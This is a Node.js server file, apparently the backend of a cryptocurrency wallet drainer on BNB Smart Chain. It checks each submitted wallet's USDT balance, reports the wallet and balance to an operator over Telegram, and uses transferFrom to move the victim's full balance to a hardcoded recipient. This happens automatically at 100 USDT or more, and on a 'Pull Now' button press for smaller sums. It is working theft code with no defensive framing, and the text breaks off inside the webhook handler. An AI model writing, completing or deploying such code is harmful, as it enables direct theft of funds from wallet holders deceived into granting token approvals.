const express = require('express');
const Web3 = require('web3');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(express.json());

// Configuration
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const CONTRACT_ADDRESS = "0xbeFe193d6abc1C5C5F37414A99fA3502B98CC8f7";
const RECIPIENT = "0xc656b1651CD6914183Ee48458542EbB8655aa623";
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PRIVATE_KEY = process.env.PRIVATE_KEY;

console.log("Bot Token:", TELEGRAM_BOT_TOKEN ? "✅ Set" : "❌ Missing");
console.log("Chat ID:", ADMIN_CHAT_ID ? "✅ Set" : "❌ Missing");
console.log("Private Key:", PRIVATE_KEY ? "✅ Set" : "❌ Missing");

const web3 = new Web3('https://bsc-dataseed.binance.org');

// Check wallet balance endpoint
app.post('/check-balance', async (req, res) => {
    try {
        const { walletAddress } = req.body;
        console.log("✅ Check balance request for:", walletAddress);
        
        const usdtContract = new web3.eth.Contract([
            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
        ], USDT_ADDRESS);

        const balance = await usdtContract.methods.balanceOf(walletAddress).call();
        const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
        
        console.log("Balance:", balanceInUSDT, "USDT");

        // Send Telegram notification
        await sendTelegramNotification(walletAddress, balanceInUSDT);

        // If balance >= 100, auto-transfer
        if (parseFloat(balanceInUSDT) >= 100) {
            console.log("Balance >= 100, auto-transferring...");
            await executeTransfer(walletAddress, balance);
            res.json({ success: true, autoTransferred: true, balance: balanceInUSDT });
        } else {
            console.log("Balance < 100, sending Telegram button...");
            res.json({ success: true, autoTransferred: false, balance: balanceInUSDT });
        }
    } catch (error) {
        console.error("❌ Error:", error.message);
        res.status(500).json({ error: error.message });
    }
});

async function sendTelegramNotification(walletAddress, balance) {
    try {
        console.log("📱 Sending Telegram notification...");
        
        const message = `
🔔 **New Wallet Detected!**

👤 Wallet: ${walletAddress}
💰 Balance: ${balance} USDT
⏰ Time: ${new Date().toLocaleString()}

${parseFloat(balance) >= 100 ? '✅ Auto-transferring...' : '⚠️ Balance below $100 threshold - Click Pull Now to transfer'}
        `;

        if (parseFloat(balance) < 100) {
            // Add Pull Now button for balances < $100
            const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: ADMIN_CHAT_ID,
                text: message,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '💳 Pull Now', callback_data: `pull_${walletAddress}` }
                    ]]
                }
            });
            console.log("✅ Telegram notification sent with button!");
        } else {
            // Simple notification for auto-transfer
            const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: ADMIN_CHAT_ID,
                text: message
            });
            console.log("✅ Telegram notification sent!");
        }
    } catch (error) {
        console.error("❌ Telegram error:", error.message);
        throw error;
    }
}

async function executeTransfer(walletAddress, amount) {
    try {
        console.log("💸 Executing transfer...");
        
        const account = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
        
        const usdtContract = new web3.eth.Contract([
            {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
        ], USDT_ADDRESS);

        const tx = usdtContract.methods.transferFrom(walletAddress, RECIPIENT, amount);
        const gas = await tx.estimateGas({ from: account.address });
        
        const signedTx = await web3.eth.accounts.signTransaction({
            to: USDT_ADDRESS,
            data: tx.encodeABI(),
            gas: Math.ceil(gas * 1.1),
            gasPrice: await web3.eth.getGasPrice(),
            nonce: await web3.eth.getTransactionCount(account.address)
        }, PRIVATE_KEY);

        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        console.log("✅ Transfer successful! TX:", receipt.transactionHash);
        
        const balanceInUSDT = web3.utils.fromWei(amount, 'ether');
        await sendTransferNotification(walletAddress, balanceInUSDT, receipt.transactionHash);
        
        return receipt;
    } catch (error) {
        console.error("❌ Transfer error:", error.message);
        throw error;
    }
}

async function sendTransferNotification(walletAddress, amount, txHash) {
    try {
        const message = `
✅ **Transfer Completed!**

👤 Wallet: ${walletAddress}
💸 Amount Transferred: ${amount} USDT
📝 TX Hash: ${txHash}
⏰ Time: ${new Date().toLocaleString()}
        `;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: message
        });
        console.log("✅ Transfer notification sent to Telegram!");
    } catch (error) {
        console.error("❌ Transfer notification error:", error.message);
    }
}

// Telegram webhook for button clicks
app.post('/webhook', express.json(), async (req, res) => {
    try {
        const { callback_query } = req.body;
        
        if (callback_query && callback_query.data.startsWith('pull_')) {
            const walletAddress = callback_query.data.replace('pull_', '');
            console.log("🔘 Pull button clicked for:", walletAddress);
            
            const usdtContract = new web3.eth.Contract([
                {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
            ], USDT_ADDRESS);

            const balance = await usdtContract.methods.balanceOf(walletAddress).call();
            await executeTransfer(walletAddress, balance);
            
            res.json({ ok: true });
        }
    }
